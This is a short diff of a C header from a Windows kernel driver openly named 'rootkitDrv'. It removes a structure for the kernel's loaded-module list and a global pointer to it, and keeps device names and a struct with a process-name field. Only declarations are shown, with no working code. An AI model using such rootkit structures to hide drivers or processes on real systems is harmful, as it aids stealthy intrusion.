@@ -4,23 +4,11 @@
 #define		ROOTKIT_WIN32_DEV_NAME		L"\\DosDevices\\rootkitDrv"
 #define		ROOTKIT_DEV_NAME			L"\\Device\\rootkitDrv"
 
-typedef struct _MODULE_ENTRY {
-	LIST_ENTRY le_mod;
-	ULONG  unknown[4];
-	ULONG  base;
-	ULONG  driver_start;
-	ULONG  unk1;
-	UNICODE_STRING driver_Path;
-	UNICODE_STRING driver_Name;
-} MODULE_ENTRY, *PMODULE_ENTRY;
 
-PMODULE_ENTRY g_PsLoadedModuleList;
 
 typedef struct {
 	PVOID notused;
 } ROOTKIT_EXT, *PROOTKIT_EXT;
-
-//NTSTATUS CompleteRequest(PIRP Irp);
 
 typedef struct {
     ULONG   processName;
